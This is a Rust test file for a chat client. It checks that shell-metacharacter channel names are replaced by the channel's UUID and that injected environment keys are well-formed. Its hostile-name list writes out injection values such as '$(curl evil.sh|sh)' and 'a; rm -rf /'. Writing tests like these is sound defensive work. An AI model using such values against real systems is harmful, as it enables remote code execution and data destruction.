//! T-1: the channel name is attacker-controlled and reaches a shell.

use crate::context::{channel_display, context_vars, is_well_formed_env_key, GuiContext};

const UUID: &str = "dbb5c335-bbce-4969-8635-7dae8338ea5b";

fn context_named(channel_name: &str) -> GuiContext {
    GuiContext {
        channel_id: UUID.to_owned(),
        channel_name: channel_name.to_owned(),
        thread_id: None,
        npub: "npub1example".to_owned(),
        relay_url: "wss://relay.example".to_owned(),
        session_id: "session-1".to_owned(),
    }
}

/// Ordinary names survive intact, including non-Latin scripts. A validator
/// that rejected these would be "safe" and useless.
#[test]
fn benign_channel_names_pass_through_unchanged() {
    for name in [
        "buzz-tui",
        "General Chat",
        "release_2.0",
        "日本語チャンネル",
        "Ünicode Ñames",
    ] {
        let context = context_named(name);
        assert_eq!(channel_display(&context), name, "rejected a benign name");
    }
}

/// Shell metacharacters are rejected — and the substitute is the UUID, not a
/// stripped name. Stripping would turn `$(evil)` into `evil`, which is
/// indistinguishable from a real channel called `evil`.
#[test]
fn hostile_channel_names_are_replaced_by_the_uuid() {
    for name in [
        "$(curl evil.sh|sh)",
        "`id`",
        "a; rm -rf /",
        "a\nPS1=pwned",
        "a$IFS$9",
        "x=y",
        "'; echo pwned; '",
        "a\0b",
    ] {
        let context = context_named(name);
        let shown = channel_display(&context);
        assert_eq!(
            shown, UUID,
            "hostile name was not replaced by the UUID: {name:?} -> {shown:?}"
        );
    }
}

/// The substitution must be *whole*, not a filtered version of the input. A
/// strip-sanitizer passes the "no metacharacters" check while still echoing
/// attacker-chosen text.
#[test]
fn rejection_substitutes_rather_than_strips() {
    let context = context_named("$(curl evil.sh|sh)");
    let shown = channel_display(&context);
    assert!(
        !shown.contains("curl") && !shown.contains("evil"),
        "attacker-chosen text survived rejection: {shown:?}"
    );
}

/// Over-long names are rejected: an env var is not a place for unbounded
/// attacker input, and a 10 KB prompt is its own denial of service.
#[test]
fn over_long_channel_names_are_replaced() {
    let context = context_named(&"a".repeat(65));
    assert_eq!(channel_display(&context), UUID);
    let ok = context_named(&"a".repeat(64));
    assert_eq!(channel_display(&ok), "a".repeat(64));
}

/// `BUZZ_CHANNEL_ID` is always the UUID, so a script has an identifier that no
/// channel name can spoof — including a channel *named* like a UUID.
#[test]
fn channel_id_is_never_the_name() {
    let context = context_named("11111111-2222-3333-4444-555555555555");
    let vars = context_vars(&context);
    let id = vars.iter().find(|(k, _)| *k == "BUZZ_CHANNEL_ID").unwrap();
    assert_eq!(
        id.1, UUID,
        "a UUID-shaped channel name displaced the real id"
    );
}

/// Absent rather than empty: `${BUZZ_THREAD_ID+set}` and `-n` must agree.
#[test]
fn thread_id_is_absent_when_there_is_no_thread() {
    let vars = context_vars(&context_named("buzz-tui"));
    assert!(!vars.iter().any(|(k, _)| *k == "BUZZ_THREAD_ID"));

    let mut context = context_named("buzz-tui");
    context.thread_id = Some("thread-1".to_owned());
    let vars = context_vars(&context);
    assert_eq!(
        vars.iter()
            .find(|(k, _)| *k == "BUZZ_THREAD_ID")
            .map(|(_, v)| v.as_str()),
        Some("thread-1")
    );
}

/// Every injected key must be POSIX-shaped. A key containing `=` would let
/// the value forge a second variable in the child's environ block.
#[test]
fn every_injected_key_is_well_formed() {
    for (key, _) in context_vars(&context_named("buzz-tui")) {
        assert!(
            is_well_formed_env_key(key),
            "malformed injected key: {key:?}"
        );
    }
}

/// The guard itself, including the bypass shape it exists for.
#[test]
fn well_formed_key_rejects_the_equals_bypass() {
    for good in ["BUZZ_CHANNEL", "_UNDERSCORE", "A1"] {
        assert!(is_well_formed_env_key(good), "rejected {good:?}");
    }
    for bad in [
        "BUZZ_CHANNEL=x",
        "",
        "1LEADING_DIGIT",
        "HAS SPACE",
        "HAS\0NUL",
        "kebab-case",
    ] {
        assert!(!is_well_formed_env_key(bad), "accepted {bad:?}");
    }
}
